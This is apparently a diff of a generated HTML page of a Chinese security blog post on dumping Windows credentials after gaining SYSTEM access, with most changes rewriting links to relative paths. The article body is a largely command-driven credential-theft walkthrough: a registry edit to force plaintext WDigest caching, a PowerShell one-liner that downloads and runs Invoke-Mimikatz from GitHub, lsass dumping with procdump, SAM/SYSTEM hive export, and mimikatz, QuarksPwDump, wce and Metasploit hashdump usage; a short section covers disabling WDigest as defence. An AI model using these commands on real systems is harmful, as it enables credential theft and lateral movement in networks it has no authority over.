@@ -7,8 +7,8 @@
 
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
-  <link rel="icon" href="/img/fluid.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="../../../../../img/fluid.png">
+  <link rel="icon" href="../../../../../img/fluid.png">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://idea-oss.github.io/img/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96.png">
 <meta property="article:published_time" content="2022-06-15T06:07:05.000Z">
-<meta property="article:modified_time" content="2022-06-20T05:32:15.774Z">
+<meta property="article:modified_time" content="2024-01-07T08:11:50.350Z">
 <meta property="article:author" content="iDea">
 <meta property="article:tag" content="内网安全">
 <meta property="article:tag" content="密码抓取">
@@ -58,12 +58,12 @@
 <link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
 
 
-<link  rel="stylesheet" href="/css/main.css" />
+<link  rel="stylesheet" href="../../../../../css/main.css" />
 
 
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  <link id="highlight-css" rel="stylesheet" href="../../../../../css/highlight.css" />
   
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+    <link id="highlight-css-dark" rel="stylesheet" href="../../../../../css/highlight-dark.css" />
   
 
 
@@ -79,8 +79,8 @@
       Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
     }
   </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
+  <script  src="../../../../../js/utils.js" ></script>
+  <script  src="../../../../../js/color-schema.js" ></script>
 
   
 <meta name="generator" content="Hexo 6.2.0"></head>
@@ -95,7 +95,7 @@
 <div class="header-inner" style="height: 85vh;">
   <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
-    <a class="navbar-brand" href="/">
+    <a class="navbar-brand" href="../../../../../index.html">
       <strong>iDea</strong>
     </a>
 
@@ -114,7 +114,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/">
+              <a class="nav-link" href="../../../../../index.html">
                 <i class="iconfont icon-home-fill"></i>
                 首页
               </a>
@@ -126,7 +126,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/archives/">
+              <a class="nav-link" href="../../../../../archives/">
                 <i class="iconfont icon-archive-fill"></i>
                 归档
               </a>
@@ -138,7 +138,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/categories/">
+              <a class="nav-link" href="../../../../../categories/">
                 <i class="iconfont icon-category-fill"></i>
                 分类
               </a>
@@ -150,7 +150,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/tags/">
+              <a class="nav-link" href="../../../../../tags/">
                 <i class="iconfont icon-tags-fill"></i>
                 标签
               </a>
@@ -162,7 +162,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/about/">
+              <a class="nav-link" href="../../../../../about/">
                 <i class="iconfont icon-user-fill"></i>
                 关于
               </a>
@@ -191,7 +191,7 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/./img/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96.png') no-repeat center center; background-size: cover;">
+     style="background: url('../../../../.././img/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96.png') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.5)">
       <div class="banner-text text-center fade-in-up">
@@ -278,28 +278,28 @@
             <div class="markdown-body">
               
               <h2 id="Hash读取"><a href="#Hash读取" class="headerlink" title="Hash读取"></a>Hash读取</h2><p>在提权成功拿到system权限之后，下一步就应该为内网渗透做准备。其中很重要的一步就是读取设备本地的hash值。工具读取hash的本质都是利用system权限去读取Windows的SAM文件。在Windows2012版本以下，还可以通过工具直接去读取内存里面的明文密码，Windows 2012之后不能再读内存中的明文，只能用mimiakatz等工具读取hash值然后进行破解。</p>
-<p> <strong>一.使用pwdump获取hash</strong><br> pwdump是一款本地hash读取工具，需要系统权限运行，直接在CMD命令窗口运行即可。测试win7、Win03、window08 均可读取hash值：<br> <img src="https://img-blog.csdnimg.cn/20210501163013602.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>下载地址:<a target="_blank" rel="noopener" href="https://www.openwall.com/passwords/windows-pwdump">https://www.openwall.com/passwords/windows-pwdump</a><br><strong>二.使用Getpassowrd</strong><br>打开命令行环境，直接运行工具即可。可获取明文密码。<br><img src="https://img-blog.csdnimg.cn/20210502170711144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>下载地址：<a target="_blank" rel="noopener" href="https://github.com/QAX-A-Team/getpass">https://github.com/QAX-A-Team/getpass</a><br><strong>三.使用mimikatz</strong><br><img src="https://img-blog.csdnimg.cn/202105021711530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>Win10或Win 2012 R2以上时，默认在内存缓存中禁止保存明文密码，密码字段显示为null，那么可通过修改注册表方式抓取明文，但需要重启电脑</p>
+<p> <strong>一.使用pwdump获取hash</strong><br> pwdump是一款本地hash读取工具，需要系统权限运行，直接在CMD命令窗口运行即可。测试win7、Win03、window08 均可读取hash值：<br> <img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161004582.png" srcset="/img/loading.gif" lazyload alt="image-20240107161004582"><br>下载地址:<a target="_blank" rel="noopener" href="https://www.openwall.com/passwords/windows-pwdump">https://www.openwall.com/passwords/windows-pwdump</a><br><strong>二.使用Getpassowrd</strong><br>打开命令行环境，直接运行工具即可。可获取明文密码。<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161013909.png" srcset="/img/loading.gif" lazyload alt="image-20240107161013909"><br>下载地址：<a target="_blank" rel="noopener" href="https://github.com/QAX-A-Team/getpass">https://github.com/QAX-A-Team/getpass</a><br><strong>三.使用mimikatz</strong><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161023483.png" srcset="/img/loading.gif" lazyload alt="image-20240107161023483"><br>Win10或Win 2012 R2以上时，默认在内存缓存中禁止保存明文密码，密码字段显示为null，那么可通过修改注册表方式抓取明文，但需要重启电脑</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 修改注册表路径,添加一个REG_DWORD类型名为UseLogonCredential设置为1,即可抓取明文</span><br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest<br><br><span class="hljs-comment"># 命令修改注册表方式如下</span><br>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f<br></code></pre></td></tr></table></figure>
 
 <p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
 <p> <strong>4.使用Powershell</strong></p>
 <p>或者可以使用Empire的powershell mimikatz<br>powersploit内置有此模块</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">powershell -<span class="hljs-built_in">exec</span> bypass<br>Import-Module .\Get-PassHashes.PS1<br>Get-PassHashes<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/d18b894b6add43709bf3817752c151ca.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161033151.png" srcset="/img/loading.gif" lazyload alt="image-20240107161033151"></p>
 <p>或者powershell版mimikataz</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ps1脚本下载</span><br>https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1<br><span class="hljs-comment"># 访问上面链接,会跳转下面链接,所以DownloadString时,使用下面链接,不然会提示“基本连接已关闭等”错误</span><br>https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1<br><br><span class="hljs-comment"># powershell抓取,前提保证目标可以访问ps1脚本,否则将脚本放在内网中 (执行速度非常慢)</span><br>powershell.exe IEX (New-Object Net.WebClient).DownloadString(<span class="hljs-string">&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;</span>);Invoke-Mimikatz<br></code></pre></td></tr></table></figure>
-<p>这里我本地搞得就不用远程下载得方式了<br><img src="https://img-blog.csdnimg.cn/20210502173737579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>这里我本地搞得就不用远程下载得方式了<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161041750.png" srcset="/img/loading.gif" lazyload alt="image-20240107161041750"></p>
 <p><strong>5.使用quarkspwdump</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">输入<br>QuarksPwDump.exe --dump-hash-local<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20210502175939817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>下载地址:<a target="_blank" rel="noopener" href="http://code.google.com/p/quarkspwdump/">http://code.google.com/p/quarkspwdump/</a> </p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161051035.png" srcset="/img/loading.gif" lazyload alt="image-20240107161051035"><br>下载地址:<a target="_blank" rel="noopener" href="http://code.google.com/p/quarkspwdump/">http://code.google.com/p/quarkspwdump/</a> </p>
 <p><strong>6.使用procdump+mimikatz</strong><br>procdump是微软官网发布得工具，可以在命令行下将目标lsass文件导出，且杀毒软件不会拦截这些操作，导出文件后将文件下载到本地，然后用mimikatz导出密码散列值。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">//使用procdump导出lsass.dmp文件<br>procdump64.exe -accepteula -ma lsass.exe lsass.dmp<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210502180911824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>导出成功，此时当前目录就会增加一个lsass.dmp文件，接下来就用Mimikatz导出密码散列值。<br><img src="https://img-blog.csdnimg.cn/20210502181441542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><strong>7.通过 SAM和System 文件抓取密码</strong><br>无工具导出SAM文件</p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161100241.png" srcset="/img/loading.gif" lazyload alt="image-20240107161100241"><br>导出成功，此时当前目录就会增加一个lsass.dmp文件，接下来就用Mimikatz导出密码散列值。<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161108564.png" srcset="/img/loading.gif" lazyload alt="image-20240107161108564"><br><strong>7.通过 SAM和System 文件抓取密码</strong><br>无工具导出SAM文件</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">reg save hklm\sam sam.hive<br>reg save hklm\system system.hive<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210502182001761.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>会在当前路径下增加两个文件 sam.hive  和 system.hive<br>使用mimikatz通过sam和system文件获取NTLM Hash</p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161117265.png" srcset="/img/loading.gif" lazyload alt="image-20240107161117265"><br>会在当前路径下增加两个文件 sam.hive  和 system.hive<br>使用mimikatz通过sam和system文件获取NTLM Hash</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">//将两个文件和Mimikatz放在同一目录下<br>lsadump::sam /sam:sam.hive  /system:system.hive<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210502182520396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161126469.png" srcset="/img/loading.gif" lazyload alt="image-20240107161126469"></p>
 <p><strong>- wce</strong><br>命令：wce.exe -w（抓取明文）、wce.exe –l（抓取hash）</p>
 <ul>
 <li><strong>限制下载文件长度时导出凭据的方法</strong><br>在c#文件中加载mimikatz的方法，实现以下功能：<br>1.获得lsass.exe进程的dmp文件并保存到temp目录<br>2.从dmp文件导出凭据<br>3.删除dmp文件<br>很多实际情况环境对下载文件做了大小限制</li>
@@ -316,10 +316,10 @@
 
 <p>4..net4.0加载mimikatz</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">C:\Windows\Microsoft.NET\Framework64\v4<span class="hljs-number">.0</span><span class="hljs-number">.30319</span>\MSBuild.exe executes-mimikatz.xmlC:\Windows\Microsoft.NET\Framework64\v4<span class="hljs-number">.0</span><span class="hljs-number">.30319</span>\MSBuild.exe executes-mimikatz.xml<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/a3493e73d4ff4acebb3ba5ea204419c8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161135261.png" srcset="/img/loading.gif" lazyload alt="image-20240107161135261"></p>
 <p><strong>- msf</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">run hashdump<br>hashdump<br>post/windows/gather/credentials/domain_hashdump(获取域<span class="hljs-built_in">hash</span>)<br>use mimikatz<br>wdigest（明文）<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/d487f3bdfe4c445f948f000fb51bf2be.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161144776.png" srcset="/img/loading.gif" lazyload alt="image-20240107161144776"></p>
 <p>实战中抓密码大部分都是直接用msf或c2上的工具抓的吧</p>
 <h2 id="单机抓密码防范方法"><a href="#单机抓密码防范方法" class="headerlink" title="单机抓密码防范方法"></a>单机抓密码防范方法</h2><p>  微软为了防止用户密码在内存种以明文形式泄露，发布了补丁KB2871997,关闭了Wdigest功能。<br>windows server 2012 及以上版本默认关闭Wdigest，使攻击者无法从内存种获取明文密码。Windows server 2012及以下的版本，如果安装了KB2871997,攻击者同样无法获取明文密码。<br>        在日常网络维护中，通过查看注册表项Wdigest，可以判断Wdigest功能的状态。如果该项的值为1，用户下次登录时，攻击者就能使用工具获取明文密码。应该确保该项的值为0，使用户明文密码不会出现在内存中。</p>
 <p>在命令行环境中开启或关闭Wdigest Auth,有如下两种方法<br>1.reg add</p>
@@ -343,7 +343,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" class="category-chain-item">内网安全</a>
+  <a href="../../../../../categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" class="category-chain-item">内网安全</a>
   
   
 
@@ -358,9 +358,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">#内网安全</a>
+        <a href="../../../../../tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">#内网安全</a>
       
-        <a href="/tags/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/">#密码抓取</a>
+        <a href="../../../../../tags/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/">#密码抓取</a>
       
     </div>
   
@@ -415,7 +415,7 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/" title="Empire使用">
+                      <a href="../../Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/" title="Empire使用">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">Empire使用</span>
                         <span class="visible-mobile">上一篇</span>
@@ -425,7 +425,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/" title="内网隧道隐藏">
+                      <a href="../../%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/" title="内网隧道隐藏">
                         <span class="hidden-mobile">内网隧道隐藏</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
@@ -579,8 +579,8 @@
 
 <script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
 <script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
+<script  src="../../../../../js/events.js" ></script>
+<script  src="../../../../../js/plugins.js" ></script>
 
 
   <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
@@ -619,7 +619,7 @@
 
 
   
-    <script  src="/js/img-lazyload.js" ></script>
+    <script  src="../../../../../js/img-lazyload.js" ></script>
   
 
 
@@ -756,7 +756,7 @@
 
   <script>Fluid.plugins.imageCaption();</script>
 
-  <script  src="/js/local-search.js" ></script>
+  <script  src="../../../../../js/local-search.js" ></script>
 
 
 
@@ -764,7 +764,7 @@
 
 <!-- 主题的启动项，将它保持在最底部 -->
 <!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
+<script  src="../../../../../js/boot.js" ></script>
 
 
   
